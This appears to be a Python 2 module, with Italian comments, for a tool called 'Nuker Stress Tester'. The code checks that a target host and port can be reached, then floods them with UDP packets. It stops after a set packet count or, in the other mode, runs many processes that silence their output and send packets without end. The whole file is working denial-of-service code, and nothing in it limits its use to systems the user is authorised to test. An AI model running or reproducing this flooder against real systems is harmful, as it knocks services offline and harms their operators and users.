#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import string
import socket
import random
import multiprocessing
from datetime import datetime

end = '\033[0m'
red = '\033[1;31m'
bright_yellow = '\033[1;33m'
bright_green = '\033[1;32m'

def check_target(target,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exist = False
    try:
        print("[#] Indirizzo: %s"%(target))
        print("[%s*%s] Verifico raggiungibilità indirizzo"%(bright_yellow,end))
        s.connect((target, port))
        print("[%s+%s] Indirizzo raggiungibile: %s > %s\n"%(bright_green,end, target,port))
        exist = True
    except socket.error:
        print("[%s-%s] Indirizzo non raggiungibile\n"%(red,end))
        exist = False
    except KeyboardInterrupt:
        exist = False
        print("\r  \n[%s-%s] Interrotto\n"%(red,end))

    s.close()
    return exist

def nuker(target,threads,limit_pkg,port):
    print("\n[#] Nuker Stress Tester\n")
    host = bytes(target)
    process = [] # processi multiprocessing
    def final():
        for t in process: # termina i processi
            t.terminate()
        import nelson as n
        n.main()
    def attack():
        sys.stdout = open(os.devnull, "w") # nessun output
        sys.stderr = open(os.devnull, "w") # nessun output
        msg = str(string.letters+string.digits+string.punctuation)
        data = "".join(random.sample(msg,5))
        dos = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # prepara socket
        while True:
            try:
                dos.sendto(data, (host,port)) # invia il pacchetto
            except socket.error:
                pass
        dos.close() # chiude socket

    # verifica se il dispositivo è connesso
    if check_target(target,port) == True:
        pass
    else:
        final()

    # limit
    if limit_pkg != None:
        sent = 0
        while str(sent) != str(limit_pkg):
            try:
                msg = str(string.letters+string.digits+string.punctuation)
                data = "".join(random.sample(msg,5))
                dos = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # prepara socket
                dos.sendto(data, (host,port)) # invia il pacchetto
                sent += 1
                sys.stdout.write("\r[%s*%s] Pacchetti inviati: %s/%s "%(bright_yellow,end, sent, limit_pkg))
                sys.stdout.flush()
                dos.close() # chiude socket
            except socket.error:
                pass
            except KeyboardInterrupt:
                print("\n[%s-%s] Interrotto\n"%(red,end))
                final()
        print("")
        ctime = datetime.now().strftime('%H:%M:%S')
        print("\n[%s+%s] Terminato: %s\n"%(bright_green,end, ctime))
    # multiprocessing
    else:
        threads = int(threads)
        threads += 1
        for i in range(1, int(threads)):
            t = multiprocessing.Process(target=attack) # prepara il processo
            process.append(t) # aggiunge il processo in lista
            t.start() # avvia il processo
        print("[%s*%s] Processi: %s"%(bright_yellow,end, len(process)))
        current_time = datetime.now().strftime('%H:%M:%S')
        msg = "\r[%s+%s] Attacco avviato: %s "%(bright_green,end, current_time)
        try:
            while True:
                sys.stdout.write(msg)
                sys.stdout.flush()
        except KeyboardInterrupt:
            sys.stdout.write(msg)
            print("\n[%s-%s] Interrotto\n"%(red,end))
            final()
